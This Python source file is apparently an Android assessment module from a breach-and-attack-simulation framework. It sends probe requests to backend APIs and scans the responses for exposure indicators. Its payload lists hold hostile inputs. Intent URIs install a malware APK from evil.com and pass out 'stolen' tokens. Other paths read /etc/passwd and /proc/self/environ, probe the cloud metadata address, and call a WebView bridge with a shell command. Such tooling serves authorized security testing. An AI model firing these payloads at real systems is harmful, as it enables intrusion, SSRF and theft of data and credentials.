"""
Android Security Assessment module.

Tests backend APIs for Android-specific attack vectors including APK download
endpoint abuse, deeplink handler hijacking, intent scheme URL injection,
exported activity enumeration, content provider URI leakage, WebView JavaScript
bridge detection, certificate pinning bypass indicators, insecure data storage
paths, Android Debug Bridge endpoint exposure, and Firebase misconfiguration.

MITRE ATT&CK: T1407 - Download New Code at Runtime
               T1418 - Software Discovery
"""

from __future__ import annotations

import re
import uuid
from typing import Any

from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus


# ---------------------------------------------------------------------------
# APK download endpoint and distribution payloads
# ---------------------------------------------------------------------------
APK_DOWNLOAD_PAYLOADS = [
    "/app/download/release.apk",
    "/app/download/debug.apk",
    "/app/download/latest.apk",
    "/app/download/beta.apk",
    "/app/download/staging.apk",
    "/downloads/app-release.apk",
    "/downloads/app-debug.apk",
    "/downloads/app-unsigned.apk",
    "/static/app.apk",
    "/static/release/app.apk",
    "/api/v1/app/download",
    "/api/v1/app/update",
    "/api/v1/app/latest-version",
    "/api/v2/app/download",
    "/api/v2/mobile/update",
    "/api/mobile/apk",
    "/api/mobile/download",
    "/api/android/update",
    "/api/android/download",
    "/build/outputs/apk/release/app-release.apk",
    "/build/outputs/apk/debug/app-debug.apk",
    "/dist/android/app.apk",
    "/releases/android/latest.apk",
    "/releases/android/current.apk",
    "/app-release.apk",
    "/app-debug.apk",
    "/app-staging.apk",
    "/android/app.apk",
    "/mobile/android/download",
    "/mobile/app/android",
    "/update/android/check",
    "/update/android/manifest.json",
    "/version/android/latest",
    "/version/android/check",
    "/.build/android/app-release.apk",
    "/.build/android/output.json",
]

# ---------------------------------------------------------------------------
# Deeplink handler abuse payloads
# ---------------------------------------------------------------------------
DEEPLINK_PAYLOADS = [
    "/api/v1/deeplink/resolve",
    "/api/v1/deeplink/redirect",
    "/api/v1/deeplink/validate",
    "/api/v1/link/resolve",
    "/api/v1/universal-link",
    "/.well-known/assetlinks.json",
    "/.well-known/app-links.json",
    "/deeplink?url=javascript://alert(1)",
    "/deeplink?url=file:///etc/passwd",
    "/deeplink?url=content://com.example.provider/data",
    "/deeplink?uri=intent://scan/#Intent;scheme=zxing;end",
    "/deeplink?redirect=http://evil.com",
    "/deeplink?target=http://127.0.0.1",
    "/api/applink?scheme=myapp&host=admin&path=/secret",
    "/api/applink?uri=myapp://admin/settings",
    "/api/link/open?url=intent://evil.com/#Intent;scheme=http;end",
    "/api/link/open?target=intent:#Intent;action=android.settings.SETTINGS;end",
    "/dl?link=intent://evil/#Intent;scheme=app;S.url=http://evil.com;end",
    "/dl?link=intent://scan/#Intent;scheme=zxing;package=com.google.zxing.client.android;end",
    "/link/redirect?deeplink=myapp://transfer?to=attacker&amount=999",
    "/applinks/resolve?uri=myapp://auth/reset-password",
    "/applinks/resolve?uri=myapp://payment/confirm",
    "/.well-known/assetlinks.json?package=com.example.app",
    "/api/v1/deeplink/create?url=http://evil.com",
    "/api/v1/deeplink/verify?target=javascript:alert(1)",
    "/api/v2/deeplink/resolve?uri=file:///data/data/com.app/databases/user.db",
    "/api/v2/deeplink/open?url=intent:#Intent;action=android.intent.action.VIEW;end",
    "/deeplink/handler?scheme=content&authority=com.app.provider&path=/users",
    "/deeplink/callback?code=test&redirect=http://evil.com",
    "/deeplink/analytics?event=click&url=http://evil.com",
    "/api/navigation/resolve?route=myapp://internal/admin",
    "/api/navigation/deeplink?uri=myapp://debug/console",
    "/api/mobile/deeplink/create",
    "/api/mobile/deeplink/track",
    "/api/deferred-deeplink/resolve",
    "/.well-known/apple-app-site-association",
]

# ---------------------------------------------------------------------------
# Intent scheme URL injection payloads
# ---------------------------------------------------------------------------
INTENT_SCHEME_PAYLOADS = [
    "/redirect?url=intent://evil.com/#Intent;scheme=http;end",
    "/redirect?url=intent:#Intent;action=android.intent.action.VIEW;data=http://evil.com;end",
    "/redirect?url=intent:#Intent;component=com.app/.AdminActivity;end",
    "/redirect?url=intent:#Intent;action=android.intent.action.SEND;type=text/plain;S.android.intent.extra.TEXT=stolen;end",
    "/redirect?url=intent:#Intent;action=android.intent.action.INSTALL_PACKAGE;data=http://evil.com/malware.apk;end",
    "/redirect?url=intent:#Intent;action=android.intent.action.DELETE;data=package:com.target.app;end",
    "/redirect?url=intent:#Intent;action=android.settings.SETTINGS;end",
    "/redirect?url=intent:#Intent;action=android.intent.action.CALL;data=tel:1234567890;end",
    "/callback?scheme=intent%3A%2F%2Fevil%23Intent%3Bscheme%3Dhttp%3Bend",
    "/api/v1/open?uri=intent://settings/#Intent;action=android.settings.WIFI_SETTINGS;end",
    "/api/v1/open?uri=intent:#Intent;component=com.app/.DebugActivity;end",
    "/api/v1/open?uri=intent:#Intent;component=com.app/.InternalActivity;S.token=stolen;end",
    "/api/v1/navigate?to=intent://admin/#Intent;scheme=app;end",
    "/api/v1/navigate?to=intent:#Intent;action=android.intent.action.MANAGE_APP_PERMISSIONS;end",
    "/api/v2/route?path=intent:#Intent;SEL;action=android.intent.action.VIEW;data=http://evil.com;end",
    "/api/v2/route?path=intent:#Intent;action=com.app.ACTION_TRANSFER;S.account=attacker;I.amount=9999;end",
    "/mobile/redirect?target=intent://scan/#Intent;scheme=zxing;end",
    "/mobile/redirect?target=intent:#Intent;launchFlags=0x10000000;component=com.app/.ExportedReceiver;end",
    "/share?url=intent:#Intent;action=android.intent.action.SEND;S.android.intent.extra.STREAM=content://media/external;end",
    "/share?url=intent:#Intent;type=*/*;action=android.intent.action.GET_CONTENT;end",
    "/goto?uri=intent:#Intent;action=android.intent.action.VIEW;data=content://contacts/people;end",
    "/goto?uri=intent:#Intent;action=android.intent.action.PICK;type=image/*;end",
    "/open?link=intent:#Intent;action=android.intent.action.PROCESS_TEXT;S.android.intent.extra.PROCESS_TEXT=test;end",
    "/open?link=intent:#Intent;action=android.app.action.DEVICE_ADMIN_ENABLED;end",
]

# ---------------------------------------------------------------------------
# Exported activity and content provider enumeration payloads
# ---------------------------------------------------------------------------
EXPORTED_COMPONENT_PAYLOADS = [
    "/api/v1/app/manifest",
    "/api/v1/app/components",
    "/api/v1/app/activities",
    "/api/v1/app/services",
    "/api/v1/app/receivers",
    "/api/v1/app/providers",
    "/api/v1/app/permissions",
    "/api/v1/app/config",
    "/api/v1/app/metadata",
    "/api/v1/app/exported-components",
    "/api/v1/content/users",
    "/api/v1/content/settings",
    "/api/v1/content/accounts",
    "/api/v1/content/files",
    "/api/v1/content/data",
    "/api/v1/content/preferences",
    "/api/v1/provider/query?uri=content://com.app.provider/users",
    "/api/v1/provider/query?uri=content://com.app.provider/settings",
    "/api/v1/provider/query?uri=content://com.app.provider/files",
    "/api/v1/provider/query?uri=content://com.app.provider/accounts",
    "/api/v1/provider/query?uri=content://com.app.provider/tokens",
    "/api/v1/provider/query?uri=content://com.app.provider/messages",
    "/api/v1/provider/query?uri=content://com.app.provider/contacts",
    "/api/v1/provider/query?uri=content://com.app.provider/logs",
    "/AndroidManifest.xml",
    "/manifest.json",
    "/app-manifest.json",
    "/android/manifest",
    "/api/debug/manifest",
    "/api/debug/components",
    "/api/debug/providers",
    "/api/debug/activities",
    "/api/internal/app-info",
    "/api/internal/component-list",
    "/api/internal/exported",
]

# ---------------------------------------------------------------------------
# WebView JavaScript bridge detection payloads
# ---------------------------------------------------------------------------
WEBVIEW_BRIDGE_PAYLOADS = [
    "/api/v1/webview/config",
    "/api/v1/webview/settings",
    "/api/v1/webview/bridge",
    "/api/v1/webview/interface",
    "/api/v1/hybrid/config",
    "/api/v1/hybrid/bridge",
    "/webview?url=javascript:void(0)",
    "/webview?url=javascript:document.cookie",
    "/webview?url=javascript:window.AndroidBridge.getToken()",
    "/webview?url=javascript:window.NativeBridge.execute('getToken')",
    "/webview?url=data:text/html,<script>alert(document.domain)</script>",
    "/webview?url=file:///android_asset/www/index.html",
    "/webview?url=file:///data/data/com.app/shared_prefs/auth.xml",
    "/webview?url=file:///sdcard/Download/sensitive.txt",
    "/webview?content=<script>Android.getAuthToken()</script>",
    "/webview?content=<img+src=x+onerror=Android.getToken()>",
    "/hybrid/execute?js=window.AppBridge.getCredentials()",
    "/hybrid/execute?js=window.webkit.messageHandlers.auth.postMessage('get')",
    "/hybrid/load?page=javascript:NativeBridge.exec('shell','id')",
    "/hybrid/load?page=file:///data/data/com.app/databases/app.db",
    "/api/v1/mobile/render?html=<script>AndroidInterface.getToken()</script>",
    "/api/v1/mobile/render?html=<iframe+src='file:///etc/passwd'>",
    "/api/v1/mobile/render?url=http://127.0.0.1:8080",
    "/api/v1/mobile/render?url=file:///proc/self/environ",
    "/api/v1/mobile/webview/load?target=javascript:void(0)",
    "/api/v1/mobile/webview/load?target=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "/api/v2/webview/proxy?url=http://169.254.169.254/latest/meta-data/",
    "/api/v2/webview/proxy?url=http://127.0.0.1/admin",
    "/webview/callback?token=test&redirect=javascript:void(0)",
    "/webview/callback?data=test&next=file:///data/data/com.app/files/",
]

# ---------------------------------------------------------------------------
# Certificate pinning bypass indicator payloads
# ---------------------------------------------------------------------------
CERT_PINNING_PAYLOADS = [
    "/api/v1/cert/verify",
    "/api/v1/cert/pin",
    "/api/v1/cert/check",
    "/api/v1/ssl/config",
    "/api/v1/ssl/pins",
    "/api/v1/security/certificate",
    "/api/v1/security/pinning-config",
    "/api/v1/network-security-config",
    "/api/v1/tls/check",
    "/network_security_config.xml",
    "/res/xml/network_security_config.xml",
    "/security/cert-pins.json",
    "/security/tls-config.json",
    "/security/pinset.json",
    "/.well-known/security.txt",
    "/api/v1/config/ssl",
    "/api/v1/config/network",
    "/api/v1/config/certificates",
    "/api/v1/config/trust-anchors",
    "/api/v2/security/cert-transparency",
    "/api/v2/security/hpkp-pins",
    "/api/v2/security/ocsp-check",
    "/debug/ssl-info",
    "/debug/cert-chain",
    "/debug/tls-version",
    "/debug/cipher-suites",
    "/api/health/ssl",
    "/api/health/tls",
    "/api/health/certificate",
    "/api/internal/ssl-config",
    "/api/internal/network-config",
]

# ---------------------------------------------------------------------------
# Insecure data storage path payloads
# ---------------------------------------------------------------------------
INSECURE_STORAGE_PAYLOADS = [
    "/api/v1/storage/list",
    "/api/v1/storage/files",
    "/api/v1/storage/external",
    "/api/v1/storage/shared",
    "/api/v1/backup/list",
    "/api/v1/backup/download",
    "/api/v1/backup/latest",
    "/api/v1/export/data",
    "/api/v1/export/database",
    "/api/v1/export/preferences",
    "/api/v1/cache/list",
    "/api/v1/cache/dump",
    "/api/v1/logs/app",
    "/api/v1/logs/crash",
    "/api/v1/logs/debug",
    "/api/v1/logs/error",
    "/shared_prefs/auth.xml",
    "/shared_prefs/credentials.xml",
    "/shared_prefs/user_prefs.xml",
    "/shared_prefs/session.xml",
    "/shared_prefs/config.xml",
    "/databases/app.db",
    "/databases/user.db",
    "/databases/auth.db",
    "/databases/cache.db",
    "/databases/sessions.db",
    "/files/tokens.json",
    "/files/config.json",
    "/files/credentials.json",
    "/files/keys.json",
    "/files/user_data.json",
    "/cache/http/",
    "/cache/image/",
    "/cache/okhttp/",
    "/cache/glide/",
    "/cache/responses/",
]

# ---------------------------------------------------------------------------
# Android Debug Bridge (ADB) endpoint payloads
# ---------------------------------------------------------------------------
ADB_ENDPOINT_PAYLOADS = [
    "/api/v1/debug/enable",
    "/api/v1/debug/shell",
    "/api/v1/debug/logcat",
    "/api/v1/debug/info",
    "/api/v1/debug/config",
    "/api/v1/debug/dump",
    "/api/v1/debug/trace",
    "/api/v1/debug/profile",
    "/api/v1/debug/heap",
    "/api/v1/debug/threads",
    "/api/v1/debug/memory",
    "/api/debug/adb",
    "/api/debug/shell",
    "/api/debug/pm-list",
    "/api/debug/am-start",
    "/api/debug/dumpsys",
    "/api/debug/getprop",
    "/api/debug/settings",
    "/api/debug/content-query",
    "/api/debug/screenshot",
    "/api/debug/screenrecord",
    "/api/debug/bugreport",
    "/debug/",
    "/debug/vars",
    "/debug/pprof",
    "/debug/requests",
    "/debug/events",
    "/debug/flags",
    "/_debug/",
    "/_debug/config",
    "/__debug__/",
    "/__debug__/shell",
]

# ---------------------------------------------------------------------------
# Firebase misconfiguration check payloads
# ---------------------------------------------------------------------------
FIREBASE_PAYLOADS = [
    "/.json",
    "/users.json",
    "/accounts.json",
    "/config.json",
    "/settings.json",
    "/admin.json",
    "/data.json",
    "/credentials.json",
    "/tokens.json",
    "/sessions.json",
    "/messages.json",
    "/notifications.json",
    "/payments.json",
    "/orders.json",
    "/profiles.json",
    "/.json?shallow=true",
    "/.json?orderBy=%22$key%22&limitToFirst=10",
    "/.json?print=pretty",
    "/.json?format=export",
    "/.json?auth=null",
    "/api/v1/firebase/config",
    "/api/v1/firebase/rules",
    "/api/v1/firebase/auth",
    "/google-services.json",
    "/firebase-config.json",
    "/firebase.json",
    "/firebaserc",
    "/.firebaserc",
    "/firebase-messaging-sw.js",
    "/firebase-debug.log",
    "/__/firebase/init.json",
    "/__/firebase/init.js",
    "/__/auth/handler",
    "/__/auth/iframe",
    "/__/auth/action",
]

# Combine all payloads
ALL_ANDROID_PAYLOADS = (
    APK_DOWNLOAD_PAYLOADS
    + DEEPLINK_PAYLOADS
    + INTENT_SCHEME_PAYLOADS
    + EXPORTED_COMPONENT_PAYLOADS
    + WEBVIEW_BRIDGE_PAYLOADS
    + CERT_PINNING_PAYLOADS
    + INSECURE_STORAGE_PAYLOADS
    + ADB_ENDPOINT_PAYLOADS
    + FIREBASE_PAYLOADS
)

# ---------------------------------------------------------------------------
# Vulnerability indicators
# ---------------------------------------------------------------------------
ANDROID_INDICATORS: list[tuple[str, str, str]] = [
    # APK / distribution indicators
    ("application/vnd.android.package-archive", "APK file served directly", "critical"),
    ("PK\x03\x04", "APK/ZIP archive content detected", "high"),
    ("classes.dex", "DEX file reference found - APK content exposed", "critical"),
    ("AndroidManifest.xml", "Android manifest file exposed", "high"),
    ("META-INF/MANIFEST.MF", "APK signing manifest exposed", "high"),
    ("versionCode", "Android version info leaked", "medium"),
    ("versionName", "Android version name leaked", "medium"),
    ("minSdkVersion", "Android minimum SDK version leaked", "low"),
    ("targetSdkVersion", "Android target SDK version leaked", "low"),

    # Deeplink / intent indicators
    ("android:scheme", "Android URI scheme definition exposed", "high"),
    ("android:host", "Android deeplink host configuration exposed", "high"),
    ("intent-filter", "Android intent filter definition exposed", "high"),
    ("android:pathPattern", "Android deeplink path pattern exposed", "medium"),
    ("android:autoVerify", "Android app link verification config exposed", "medium"),
    ("assetlinks.json", "Android asset links file found", "medium"),
    ("package_name", "Android package name exposed in asset links", "medium"),
    ("sha256_cert_fingerprints", "Certificate fingerprints exposed in asset links", "high"),

    # Exported component indicators
    ("android:exported=\"true\"", "Exported Android component found", "high"),
    ("android:permission=\"\"", "Unprotected Android component found", "critical"),
    ("android:protectionLevel", "Android protection level info leaked", "medium"),
    ("exported-components", "Exported component listing exposed", "high"),
    ("content://", "Android content provider URI exposed", "high"),
    ("android:authorities", "Content provider authority exposed", "high"),
    ("android:grantUriPermissions", "Content provider URI permissions exposed", "high"),
    ("android:readPermission", "Content provider read permission exposed", "medium"),
    ("android:writePermission", "Content provider write permission exposed", "medium"),

    # WebView / JavaScript bridge indicators
    ("addJavascriptInterface", "WebView JavaScript interface detected", "critical"),
    ("@JavascriptInterface", "WebView JavaScript bridge annotation found", "critical"),
    ("evaluateJavascript", "WebView JavaScript evaluation detected", "high"),
    ("setJavaScriptEnabled", "WebView JavaScript enabled indicator", "medium"),
    ("setAllowFileAccess", "WebView file access enabled indicator", "high"),
    ("setAllowUniversalAccessFromFileURLs", "WebView universal file access enabled", "critical"),
    ("setAllowContentAccess", "WebView content access enabled indicator", "high"),
    ("NativeBridge", "Native bridge interface exposed", "high"),
    ("AndroidBridge", "Android bridge interface exposed", "high"),
    ("AppBridge", "Application bridge interface exposed", "high"),

    # Certificate pinning indicators
    ("network_security_config", "Network security config reference found", "medium"),
    ("trust-anchors", "Certificate trust anchor configuration exposed", "high"),
    ("pin-set", "Certificate pinning set configuration exposed", "high"),
    ("certificates src=\"user\"", "User certificate trust enabled", "critical"),
    ("cleartextTrafficPermitted", "Cleartext traffic permitted flag found", "high"),
    ("cleartextTrafficPermitted=\"true\"", "Cleartext HTTP traffic explicitly allowed", "critical"),
    ("domain-config", "Domain-specific network config exposed", "medium"),

    # Insecure storage indicators
    ("shared_prefs", "Shared preferences path exposed", "high"),
    ("SharedPreferences", "SharedPreferences reference exposed", "high"),
    ("getExternalFilesDir", "External storage path reference found", "medium"),
    ("getExternalStorageDirectory", "External storage directory reference found", "high"),
    ("MODE_WORLD_READABLE", "World-readable file mode detected", "critical"),
    ("MODE_WORLD_WRITEABLE", "World-writable file mode detected", "critical"),
    ("openFileOutput", "File output operation reference found", "medium"),
    ("SQLiteDatabase", "SQLite database reference found", "medium"),

    # Debug endpoint indicators
    ("android.os.Debug", "Android debug class reference found", "high"),
    ("debuggable", "Debuggable flag found", "high"),
    ("android:debuggable=\"true\"", "Application debuggable flag set to true", "critical"),
    ("Debug.isDebuggerConnected", "Debugger connection check reference", "medium"),
    ("StrictMode", "StrictMode reference found", "medium"),
    ("BuildConfig.DEBUG", "Debug build config reference found", "medium"),
    ("logcat", "Logcat reference found", "medium"),
    ("adb_enabled", "ADB enabled flag found", "high"),

    # Firebase indicators
    ("firebaseio.com", "Firebase Realtime Database URL exposed", "high"),
    ("firebase", "Firebase reference found", "low"),
    ("google-services", "Google services configuration reference", "medium"),
    ("apiKey", "Firebase API key exposed", "high"),
    ("messagingSenderId", "Firebase messaging sender ID exposed", "medium"),
    ("storageBucket", "Firebase storage bucket exposed", "medium"),
    ("appId", "Firebase app ID exposed", "medium"),
    ("databaseURL", "Firebase database URL exposed", "high"),
    ("gcm_defaultSenderId", "GCM sender ID exposed", "medium"),
    ("project_id", "Firebase project ID exposed", "medium"),
    ("rules_version", "Firebase security rules version exposed", "high"),
    ("\".read\": true", "Firebase read rules publicly open", "critical"),
    ("\".write\": true", "Firebase write rules publicly open", "critical"),
    ("\"rules\":", "Firebase security rules exposed", "high"),
]


class AndroidSecurityModule(BaseAttackModule):
    """
    Android Security Assessment module.

    Performs comprehensive testing of backend APIs for Android-specific attack
    surfaces including APK distribution endpoint abuse, deeplink handler
    hijacking, intent scheme URL injection, exported activity and content
    provider enumeration, WebView JavaScript bridge detection, certificate
    pinning bypass indicators, insecure data storage paths, Android Debug
    Bridge endpoint exposure, and Firebase misconfiguration checks.
    """

    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(
            name="android_security",
            description=(
                "Android security assessment - APK endpoint abuse, deeplink hijacking, "
                "intent scheme injection, exported component enumeration, WebView bridge "
                "detection, cert pinning bypass, insecure storage, ADB endpoints, "
                "Firebase misconfiguration"
            ),
            category="mobile",
            mitre_technique_ids=["T1407", "T1418"],
            mitre_technique_names=[
                "Download New Code at Runtime",
                "Software Discovery",
            ],
            auth_level_required=AuthorizationLevel.FULL,
            owasp_category="M1:2024 - Improper Credential Usage",
            cwe_ids=["CWE-295", "CWE-749", "CWE-927", "CWE-939", "CWE-200", "CWE-532"],
            tags=[
                "android", "mobile", "apk", "deeplink", "intent", "webview",
                "firebase", "certificate-pinning", "content-provider", "adb",
                "exported-component", "insecure-storage", "javascript-bridge",
            ],
        )

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        """Retrieve Android security testing payloads."""
        if self._payload_db:
            db_payloads = await self._payload_db.get_payloads("android_security", limit=500)
            if db_payloads:
                return db_payloads

        target_name = self._extract_target_name(target)
        resolved: list[str] = []
        for payload in ALL_ANDROID_PAYLOADS:
            resolved.append(payload.replace("{target}", target_name))

        return resolved

    def _build_requests(
        self, target: str, payloads: list[str], options: dict[str, Any]
    ) -> list[AttackRequest]:
        requests: list[AttackRequest] = []
        target_name = self._extract_target_name(target)

        for payload in payloads:
            req_id = str(uuid.uuid4())[:8]

            # Firebase database probes (direct .json access)
            if payload.endswith(".json") and not payload.startswith("/api"):
                firebase_project = options.get("firebase_project", target_name)
                firebase_url = f"https://{firebase_project}.firebaseio.com"
                requests.append(AttackRequest(
                    request_id=f"android-firebase-{req_id}",
                    target=firebase_url,
                    method="GET",
                    path=payload,
                    headers={"X-BAS-Payload": payload},
                    timeout=options.get("timeout", 10.0),
                    follow_redirects=False,
                ))
                continue

            # Firebase hosting endpoints
            if payload.startswith("/__/"):
                requests.append(AttackRequest(
                    request_id=f"android-fbhost-{req_id}",
                    target=target,
                    method="GET",
                    path=payload,
                    headers={
                        "X-BAS-Payload": payload,
                        "Accept": "application/json",
                    },
                    timeout=options.get("timeout", 10.0),
                    follow_redirects=False,
                ))
                continue

            # APK download requests need Accept header for binary
            if ".apk" in payload:
                requests.append(AttackRequest(
                    request_id=f"android-apk-{req_id}",
                    target=target,
                    method="GET",
                    path=payload,
                    headers={
                        "X-BAS-Payload": payload,
                        "Accept": "application/vnd.android.package-archive, application/octet-stream",
                        "User-Agent": "Android/12 Dalvik/2.1.0",
                    },
                    timeout=options.get("timeout", 15.0),
                    follow_redirects=options.get("follow_redirects", False),
                ))
                continue

            # Intent scheme / deeplink payloads with query parameters
            if "intent:" in payload or "deeplink" in payload or "applink" in payload:
                requests.append(AttackRequest(
                    request_id=f"android-intent-{req_id}",
                    target=target,
                    method="GET",
                    path=payload,
                    headers={
                        "X-BAS-Payload": payload[:200],
                        "User-Agent": "Android/12 Dalvik/2.1.0",
                        "X-Requested-With": "com.example.app",
                    },
                    timeout=options.get("timeout", 10.0),
                    follow_redirects=False,
                ))
                continue

            # Standard path-based payloads
            requests.append(AttackRequest(
                request_id=f"android-probe-{req_id}",
                target=target,
                method="GET",
                path=payload,
                headers={
                    "X-BAS-Payload": payload[:200],
                    "User-Agent": "Android/12 Dalvik/2.1.0",
                },
                timeout=options.get("timeout", 15.0),
                follow_redirects=options.get("follow_redirects", False),
            ))

        return requests

    def _analyze_response(
        self, request: AttackRequest, response: AttackResponse, payload: str
    ) -> ModuleResult:
        body = response.body_text
        payload_used = request.headers.get("X-BAS-Payload", payload)

        if response.error:
            return ModuleResult(
                module_name="android_security",
                target=request.target,
                status=VulnStatus.NOT_VULNERABLE,
                payload_used=payload_used,
                response_code=response.status_code,
                elapsed_ms=response.elapsed_ms,
                detail={"error": response.error},
            )

        # Check against indicator list
        for indicator, desc, severity in ANDROID_INDICATORS:
            if indicator in body:
                status = (
                    VulnStatus.VULNERABLE
                    if severity in ("critical", "high")
                    else VulnStatus.POTENTIALLY_VULNERABLE
                )
                return ModuleResult(
                    module_name="android_security",
                    target=request.target,
                    status=status,
                    payload_used=payload_used,
                    response_code=response.status_code,
                    response_body_preview=body[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"Android security issue: {desc} (indicator: '{indicator}')",
                    severity=severity,
                    mitre_technique_id="T1407",
                    detail={
                        "detection_type": "android_indicator",
                        "indicator": indicator,
                        "headers": dict(response.headers),
                    },
                )

        # Regex-based detection patterns
        regex_patterns = [
            (r"com\.[a-z]+\.[a-z]+\.(?:activity|service|receiver|provider)\.\w+",
             "Android component class name exposed", "high"),
            (r"content://[a-z0-9.]+/[a-z_]+",
             "Content provider URI pattern found", "high"),
            (r"AIza[0-9A-Za-z_-]{35}",
             "Firebase API key pattern found", "critical"),
            (r"[0-9]+-[a-z0-9]+\.apps\.googleusercontent\.com",
             "Google OAuth client ID exposed", "high"),
            (r"(?i)firebase[_-]?(?:database|storage|auth|messaging)[_-]?(?:url|bucket|key|id)\s*[=:]\s*\S+",
             "Firebase configuration value exposed", "high"),
            (r"(?i)android[_-]?(?:key|secret|token|api[_-]?key)\s*[=:]\s*[\"']?\w+",
             "Android API key or secret exposed", "critical"),
            (r"intent://[^\s#]+#Intent;[^\s]+end",
             "Intent URI scheme found in response", "high"),
            (r"(?i)(?:debug|test|staging)[_-]?(?:mode|flag|enabled)\s*[=:]\s*(?:true|1|yes)",
             "Debug or test mode enabled", "high"),
        ]
        for pattern, desc, severity in regex_patterns:
            match = re.search(pattern, body)
            if match:
                return ModuleResult(
                    module_name="android_security",
                    target=request.target,
                    status=VulnStatus.VULNERABLE if severity in ("critical", "high") else VulnStatus.POTENTIALLY_VULNERABLE,
                    payload_used=payload_used,
                    response_code=response.status_code,
                    response_body_preview=body[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"Android security issue: {desc} (match: '{match.group()[:80]}')",
                    severity=severity,
                    mitre_technique_id="T1418",
                    detail={"detection_type": "regex_pattern", "pattern": pattern},
                )

        # APK binary response detection via Content-Type header
        content_type = response.headers.get("content-type", "").lower()
        if "android.package-archive" in content_type or "octet-stream" in content_type:
            if response.status_code == 200 and len(body) > 100:
                return ModuleResult(
                    module_name="android_security",
                    target=request.target,
                    status=VulnStatus.VULNERABLE,
                    payload_used=payload_used,
                    response_code=response.status_code,
                    response_body_preview="[binary APK content]",
                    elapsed_ms=response.elapsed_ms,
                    evidence="APK file served via unprotected endpoint",
                    severity="critical",
                    mitre_technique_id="T1407",
                    detail={
                        "detection_type": "apk_download",
                        "content_type": content_type,
                        "content_length": response.headers.get("content-length", "unknown"),
                    },
                )

        # Firebase database open access detection
        if "firebaseio.com" in request.target:
            if response.status_code == 200 and body.strip() not in ("null", "", "{}"):
                return ModuleResult(
                    module_name="android_security",
                    target=request.target,
                    status=VulnStatus.VULNERABLE,
                    payload_used=payload_used,
                    response_code=response.status_code,
                    response_body_preview=body[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence="Firebase Realtime Database publicly accessible",
                    severity="critical",
                    mitre_technique_id="T1418",
                    detail={"detection_type": "firebase_open_access"},
                )

        # Sensitive path content detection
        sensitive_paths = [
            "/shared_prefs/", "/databases/", "/files/", "/cache/",
            "/debug/", "/_debug/", "/__debug__/", "/api/debug/",
            "/manifest", "/components", "/providers", "/activities",
        ]
        if response.status_code == 200 and len(body.strip()) > 0:
            if any(sp in (request.path or "") for sp in sensitive_paths):
                return ModuleResult(
                    module_name="android_security",
                    target=request.target,
                    status=VulnStatus.POTENTIALLY_VULNERABLE,
                    payload_used=payload_used,
                    response_code=response.status_code,
                    response_body_preview=body[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"Sensitive Android path returned content: {request.path}",
                    severity="medium",
                    mitre_technique_id="T1418",
                    detail={"detection_type": "sensitive_path_content"},
                )

        return ModuleResult(
            module_name="android_security",
            target=request.target,
            status=VulnStatus.NOT_VULNERABLE,
            payload_used=payload_used,
            response_code=response.status_code,
            elapsed_ms=response.elapsed_ms,
        )

    @staticmethod
    def _extract_target_name(target: str) -> str:
        """Extract a clean name from the target URL for enumeration."""
        from urllib.parse import urlparse
        parsed = urlparse(target)
        hostname = parsed.hostname or target
        name = hostname.replace("www.", "").split(".")[0]
        return name if name else "target"
